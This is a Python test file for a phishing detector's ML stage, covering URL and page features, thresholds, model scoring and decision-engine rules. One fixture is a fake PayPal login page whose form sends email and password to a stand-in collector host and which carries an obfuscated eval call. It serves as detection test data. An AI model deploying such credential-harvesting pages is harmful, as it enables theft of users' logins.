"""Tests for the ML stage: features, thresholds, runtime scoring and decision-engine integration."""
import math
import os
import random

import numpy as np
import pytest

from core_engine.final_decision_engine import FinalDecisionEngine
from ml import trainlib
from ml.features import (LEXICAL_FEATURES, LEXICAL_HOST_FEATURES, PAGE_FEATURES, empty_page_features, group_key,
                         lexical_features, page_features)
from ml.model_runtime import ModelRuntime, band_of, ml_to_score

PHISH_HTML = """<html><head><title>PayPal - Log in</title></head><body>
<form action="https://collector.example-evil.top/post.php" method="post">
<input type="text" name="email"><input type="password" name="pw"></form>
<script>eval(atob('YWxlcnQoMSk='));document.addEventListener('contextmenu', e => e.preventDefault());</script>
</body></html>"""


def test_feature_names_are_complete_and_numeric():
    f = lexical_features("https://secure-paypal.verify-account.xyz/login.php?id=1")
    assert set(f) == set(LEXICAL_FEATURES)
    assert all(isinstance(v, float) and not math.isnan(v) for v in f.values())
    assert f["brand_mismatch"] == 1 and f["tld_abused"] == 1 and f["file_ext_php"] == 1


def test_official_brand_domain_is_not_a_brand_mismatch():
    assert lexical_features("https://www.paypal.com/signin")["brand_mismatch"] == 0
    assert lexical_features("https://paypal.com.evil-login.top/")["brand_mismatch"] == 1


def test_free_hosting_and_ip_hosts_detected():
    assert lexical_features("https://abc123.vercel.app/")["free_hosting"] == 1
    assert lexical_features("http://192.0.2.10:8080/x")["is_ip_host"] == 1


def test_page_features_see_login_form_posting_elsewhere():
    pf = page_features(PHISH_HTML, "https://paypa1-secure.example/", "https://paypa1-secure.example/", {})
    assert set(pf) == set(PAGE_FEATURES)
    assert pf["n_password"] == 1 and pf["form_action_external"] == 1
    assert pf["title_brand"] == 1 and pf["title_brand_mismatch"] == 1
    assert pf["obfuscation_calls"] >= 1 and pf["right_click_blocked"] == 1


def test_unreachable_page_gives_unknown_not_zero():
    pf = page_features("", "https://x.example/", "https://x.example/", {"domain_age_days": 12})
    assert pf["page_reachable"] == 0.0
    assert math.isnan(pf["n_forms"])
    assert pf["domain_age_days"] == 12.0
    assert set(empty_page_features()) == set(PAGE_FEATURES)


def test_split_is_stable_and_by_site():
    assert trainlib.split_of("example.com") == trainlib.split_of("example.com")
    assert group_key("https://a.example.com/x") == group_key("https://b.example.com/y")
    assert group_key("https://one.vercel.app/") != group_key("https://two.vercel.app/")


def test_score_mapping_matches_band_cutoffs():
    t_low, t_high = 0.2, 0.9
    last = -1.0
    for p in np.linspace(0, 1, 201):
        score = ml_to_score(p, t_low, t_high)
        assert score >= last - 1e-9
        last = score
        band = band_of(p, t_low, t_high)
        if band == "SAFE":
            assert score < 50
        elif band == "SUSPICIOUS":
            assert 50 <= score < 80
        else:
            assert score >= 80


def test_thresholds_respect_precision_and_miss_rate():
    rng = np.random.default_rng(1)
    y = np.array([1] * 500 + [0] * 500)
    p = np.concatenate([rng.beta(6, 2, 500), rng.beta(2, 6, 500)])
    thr = trainlib.choose_thresholds(y, p, assumed_prevalence=0.05, target_precision=0.99, max_miss_rate=0.02)
    assert 0 <= thr["t_low"] < thr["t_high"] <= 1
    assert (p[y == 1] < thr["t_low"]).mean() <= 0.03


def _train_tiny_artifacts(directory):
    """Real LightGBM models on a toy rule, saved with the production artifact layout."""
    from ml.features import FEATURE_VERSION
    rng = random.Random(3)
    bad = ["https://secure-login-{}.xyz/verify.php?id={}", "http://paypal-update{}.top/login?x={}",
           "https://account-confirm{}.icu/signin.php?s={}"]
    good = ["https://www.example{}.com/about?p={}", "https://docs{}.python.org/3/library/{}.html",
            "https://news{}.bbc.co.uk/world/{}"]
    urls, y = [], []
    for i in range(300):
        urls.append(rng.choice(bad).format(rng.randint(1, 999), rng.randint(1, 99999))); y.append(1)
        urls.append(rng.choice(good).format(rng.randint(1, 999), rng.randint(1, 99999))); y.append(0)
    X = np.array([[lexical_features(u)[n] for n in LEXICAL_HOST_FEATURES] for u in urls], dtype=np.float32)
    y = np.array(y)
    clf = trainlib.fit_lgbm(X, y, X, y)
    raw = clf.predict_proba(X)[:, 1]
    cal = trainlib.fit_calibrator(raw, y)
    thr = trainlib.choose_thresholds(y, cal.predict(raw))
    import joblib
    os.makedirs(directory, exist_ok=True)
    joblib.dump({"model": clf, "calibrator": cal, "features": LEXICAL_HOST_FEATURES, "feature_version": FEATURE_VERSION,
                 "thresholds": thr, "version": "test"}, os.path.join(directory, "lexical_model.joblib"))


def test_runtime_scores_with_a_real_model(tmp_path, monkeypatch):
    monkeypatch.setenv("ENABLE_ML", "true")
    _train_tiny_artifacts(str(tmp_path))
    rt = ModelRuntime(str(tmp_path))
    bad = rt.score("https://secure-login-123.xyz/verify.php?id=777")
    good = rt.score("https://www.example42.com/about?p=9")
    assert bad["model"] == good["model"] == "lexical"
    assert bad["probability"] > good["probability"]
    assert bad["band"] in ("SUSPICIOUS", "DANGEROUS") and good["band"] == "SAFE"
    assert 0 <= bad["score"] <= 100


def test_runtime_returns_none_without_models(tmp_path):
    rt = ModelRuntime(str(tmp_path / "missing"))
    assert rt.available() is False
    assert rt.score("https://example.com/") is None


def test_runtime_can_be_disabled(tmp_path, monkeypatch):
    _train_tiny_artifacts(str(tmp_path))
    monkeypatch.setenv("ENABLE_ML", "false")
    assert ModelRuntime(str(tmp_path)).score("https://example.com/") is None


def test_decision_engine_uses_ml_score_without_hard_override():
    ml = {"score": 91.0, "probability": 0.97, "band": "DANGEROUS", "model": "page", "model_version": "t",
          "signals": ["login form with password field"]}
    out = FinalDecisionEngine().evaluate(url="https://new-site.example/", ml=ml)
    assert out["verdict"].startswith("CRITICAL") and out["threat_score"] == 91.0
    assert out["telemetry"]["ml_used"] is True
    assert "ML classifier" in out["summary"]

    safe = FinalDecisionEngine().evaluate(url="https://new-site.example/", ml={**ml, "score": 12.0, "band": "SAFE", "probability": 0.02})
    assert safe["verdict"].startswith("LEGITIMATE")


def test_hard_rules_still_override_a_safe_ml_verdict():
    ml = {"score": 5.0, "probability": 0.01, "band": "SAFE", "model": "lexical", "signals": []}
    out = FinalDecisionEngine().evaluate(url="https://x.example/", known_db_match=1, ml=ml)
    assert out["threat_score"] == 100.0


def test_engine_without_ml_is_unchanged():
    out = FinalDecisionEngine().evaluate(url="https://x.example/")
    assert out["telemetry"]["ml_used"] is False


def test_evidence_features_from_sandbox_v2():
    from ml.features import EVIDENCE_FEATURES, evidence_features
    empty = evidence_features(None)
    assert set(empty) == set(EVIDENCE_FEATURES) and all(math.isnan(v) for v in empty.values())
    ev = {"credential_surface_found": True, "sensitive_field_types": ["password", "otp"], "probe_credentials_sent": True,
          "submit_cross_domain": True, "wording": {"urgency": 2, "threat": 1}, "brand_owns_domain": False,
          "tls_issuer": "Let's Encrypt", "domain_age_days": 4, "claimed_brand": "hdfc"}
    f = evidence_features(ev)
    assert f["ev_cred_found"] == 1 and f["ev_has_password"] == 1 and f["ev_has_otp"] == 1 and f["ev_submit_cross_domain"] == 1
    assert f["ev_brand_owns_domain"] == 0.0 and f["ev_tls_free_ca"] == 1 and f["ev_domain_age_days"] == 4
    assert math.isnan(evidence_features({**ev, "brand_owns_domain": None})["ev_brand_owns_domain"])      # unknown stays unknown


# ---- shared-hosting bias fix --------------------------------------------------------------------------------------------

def test_is_hosted_recognises_shared_hosting_platforms():
    from ml.features import is_hosted
    assert is_hosted("https://my-app.vercel.app/") and is_hosted("https://someone.github.io/blog") and is_hosted("https://x.netlify.app")
    assert not is_hosted("https://www.google.com/") and not is_hosted("https://example.co.uk/")


def test_hosted_balance_weights_stop_phishing_from_drowning_the_few_benign_hosted_sites():
    import numpy as np
    from ml import trainlib
    urls = ["https://a%d.vercel.app/" % i for i in range(40)] + ["https://good1.vercel.app/", "https://good2.netlify.app/",
                                                                  "https://plain.example.com/", "https://other.example.org/"]
    labels = np.array([1] * 40 + [0, 0, 0, 0])
    weights, stat = trainlib.hosted_balance_weights(urls, labels)
    assert stat["hosted_malicious"] == 40 and stat["hosted_benign"] == 2
    assert weights[40] == weights[41] == 8.0                     # capped: 40/2 = 20 would be too aggressive
    assert weights[42] == weights[43] == 1.0 and (weights[:40] == 1.0).all()       # nothing else is touched


def test_hosted_benign_loader_collects_real_projects_and_ignores_the_rest(monkeypatch, tmp_path):
    from ml import datasets
    monkeypatch.setattr(datasets, "RAW_DIR", str(tmp_path))
    monkeypatch.setattr(datasets.time, "sleep", lambda s: None)
    monkeypatch.setattr(datasets, "HOSTED_TOPICS", ["vercel"])
    monkeypatch.setattr(datasets, "HOSTED_STAR_BANDS", [(15, 40)])
    calls = []

    class Resp:
        status_code = 200

        def json(self):
            return {"items": [{"homepage": "https://cool-app.vercel.app/"}, {"homepage": "https://cool-app.vercel.app/about"},
                              {"homepage": "http://insecure.vercel.app/"}, {"homepage": "https://example.com/"},
                              {"homepage": ""}, {"homepage": "https://my.github.io/site"}]}

    monkeypatch.setattr(datasets.requests, "get", lambda *a, **k: calls.append(k.get("params")) or Resp())
    urls = datasets.load_hosted_benign(refresh=True, target=100)
    assert urls == ["https://cool-app.vercel.app/", "https://my.github.io/"]      # https only, hosted only, one per host
    assert calls and "topic:vercel" in calls[0]["q"]
    # the second call uses the cached file instead of asking GitHub again
    monkeypatch.setattr(datasets.requests, "get", lambda *a, **k: (_ for _ in ()).throw(AssertionError("must use the cache")))
    assert datasets.load_hosted_benign(refresh=False, target=2) == urls


def test_hosted_benign_loader_survives_a_rate_limit(monkeypatch, tmp_path):
    from ml import datasets
    monkeypatch.setattr(datasets, "RAW_DIR", str(tmp_path))
    monkeypatch.setattr(datasets.time, "sleep", lambda s: None)

    class Limited:
        status_code = 403

    monkeypatch.setattr(datasets.requests, "get", lambda *a, **k: Limited())
    assert datasets.load_hosted_benign(refresh=True, target=10) == []


# ---- training progress helpers -------------------------------------------------------------------------------------------------

def test_progress_clock_and_log_file(tmp_path, monkeypatch, capsys):
    import sys
    from ml import trainlib
    assert trainlib.fmt_secs(5) == "5s" and trainlib.fmt_secs(125) == "2m05s" and trainlib.fmt_secs(7300) == "2h01m"
    log = tmp_path / "run.log"
    tee = trainlib._Tee(open(log, "w", encoding="utf-8"))
    tee.write("hello\nsecond line\n")
    tee.write("partial ")
    tee.write("line\n")
    tee.flush()
    text = log.read_text(encoding="utf-8")
    assert text.count("[+") == 3 and "hello" in text and "partial line" in text      # one clock per line, none mid-line


def test_feature_cache_computes_once_then_loads_from_disk(tmp_path, monkeypatch):
    import numpy as np
    from ml import trainlib
    monkeypatch.setattr(trainlib.os.path, "dirname", lambda p: str(tmp_path))
    calls = []

    def featurize(urls):
        calls.append(len(urls))
        return np.arange(len(urls) * 3, dtype=np.float32).reshape(len(urls), 3)

    first = trainlib.cached_features(["https://a.example/", "https://b.example/"], featurize, "t", 2)
    second = trainlib.cached_features(["https://a.example/", "https://b.example/"], featurize, "t", 2)
    changed = trainlib.cached_features(["https://a.example/", "https://c.example/"], featurize, "t", 2)
    assert calls == [2, 2] and (first == second).all() and changed.shape == (2, 3)     # same list -> cached; new list -> recomputed


def test_dead_and_placeholder_pages_are_ignored_by_training():
    from ml.trainlib import is_dead_page
    dead = [{"evidence": {"page_title": "Site not found \u00b7 GitHub Pages", "http_status": 404}},
            {"evidence": {"page_title": "Website Takedown Notice - Lovable Trust & Safety", "http_status": 200}},
            {"evidence": {"page_title": "This app isn't live yet", "http_status": 200}},
            {"evidence": {"page_title": "Anything", "http_status": 503}}]
    live = [{"evidence": {"page_title": "DATUM - Planning-to-Execution Bridge", "http_status": 200}},
            {"evidence": {"page_title": "My portfolio", "http_status": 200}}, {"evidence": {}}, {}]
    assert all(is_dead_page(r) for r in dead) and not any(is_dead_page(r) for r in live)


def test_asking_for_zero_malicious_pages_collects_none(monkeypatch):
    import random
    from ml import collect_dataset
    monkeypatch.setattr(collect_dataset.datasets, "load_phishtank", lambda r: (_ for _ in ()).throw(AssertionError("must not load")))
    assert collect_dataset.pick_malicious(0, random.Random(1), set(), False) == []


def test_hosted_weights_balance_in_both_directions():
    import numpy as np
    from ml import trainlib
    many_benign = ["https://b%d.vercel.app/" % i for i in range(30)] + ["https://m%d.vercel.app/" % i for i in range(5)]
    labels = np.array([0] * 30 + [1] * 5)
    weights, stat = trainlib.hosted_balance_weights(many_benign, labels)
    assert stat["malicious_hosted_weight"] == 6.0 and stat["benign_hosted_weight"] == 1.0
    assert (weights[30:] == 6.0).all() and (weights[:30] == 1.0).all()
